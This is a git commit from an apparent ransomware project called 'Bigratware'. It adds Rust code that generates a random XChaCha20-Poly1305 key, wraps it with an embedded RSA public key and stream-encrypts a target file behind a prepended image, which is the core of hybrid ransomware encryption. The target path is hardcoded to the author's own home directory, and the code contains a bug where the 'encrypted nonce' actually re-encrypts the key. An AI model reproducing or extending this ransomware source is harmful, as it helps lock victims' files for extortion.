4c9fc55e4606b0516c735efa5d3d160593c4494a
Rafał Baran <70489677+rafal06@users.noreply.github.com>
2023-12-09 15:00:30 +0100

    Bigratware: Implement encryption algorithm

---
+++ bigratware/src/encrypt_file.rs
@@ -0,0 +1,54 @@
+use std::fs::{File, OpenOptions};
+use std::io::{Read, Write};
+use chacha20poly1305::aead::OsRng;
+use chacha20poly1305::aead::stream::EncryptorBE32;
+use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
+use rand::prelude::ThreadRng;
+use rand::RngCore;
+use rsa::{Oaep, RsaPublicKey};
+use sha2::Sha512;
+use crate::BIGRAT_PNG;
+
+const BUFFER_SIZE: usize = 500;
+
+pub fn encrypt_file(
+    source_file: &mut File,
+    public_key: RsaPublicKey,
+    rng: &mut ThreadRng,
+) -> anyhow::Result<()> {
+    let mut dist_file = OpenOptions::new()
+        .append(true)
+        .create(true)
+        .open("/home/rafal/boykisser-rat.png")?;
+
+    dist_file.set_len(0)?;
+    dist_file.write_all(BIGRAT_PNG)?;
+
+    let mut key = [0u8; 32];
+    let mut nonce = [0u8; 19];
+    OsRng.fill_bytes(&mut key);
+    OsRng.fill_bytes(&mut nonce);
+
+    let encrypted_key = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)?;
+    dist_file.write_all(encrypted_key.as_slice())?;
+    let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)?;
+    dist_file.write_all(encrypted_nonce.as_slice())?;
+
+    let aead = XChaCha20Poly1305::new(key.as_ref().into());
+    let mut stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());
+
+    let mut buffer = [0u8; BUFFER_SIZE];
+    loop {
+        let read_count = source_file.read(&mut buffer)?;
+        if read_count == BUFFER_SIZE {
+            let ciphertext = stream_encryptor.encrypt_next(buffer.as_slice()).unwrap();
+            let _ = dist_file.write(&ciphertext)?;
+        } else {
+            let ciphertext = stream_encryptor.encrypt_last(&buffer[..read_count]).unwrap();
+            let _ = dist_file.write(&ciphertext)?;
+            break;
+        }
+    }
+
+    Ok(())
+}
--- bigratware/src/main.rs
+++ bigratware/src/main.rs
@@ -1,6 +1,20 @@
-const BIGRAT_PNG: &[u8; 1044942] = include_bytes!("../../bigrat.png");
-// const CIPHER_KEY: &[u8; 32] = include_bytes!("../../key.bin");
+mod encrypt_file;
 
-fn main() {
-    println!("Hello, world!");
+use std::fs::File;
+use rsa::pkcs8::DecodePublicKey;
+use rsa::RsaPublicKey;
+use anyhow::Result;
+use crate::encrypt_file::encrypt_file;
+
+const BIGRAT_PNG: &[u8; 1044942] = include_bytes!("../../bigrat.png");
+const PUBLIC_KEY: &[u8; 294] = include_bytes!("../../public-key.der");
+
+fn main() -> Result<()> {
+    let pub_key = RsaPublicKey::from_public_key_der(PUBLIC_KEY)?;
+    let mut rng = rand::thread_rng();
+
+    let mut file_to_encrypt = File::open("/home/rafal/boykisser.png")?;
+    encrypt_file(&mut file_to_encrypt, pub_key, &mut rng)?;
+
+    Ok(())
 }
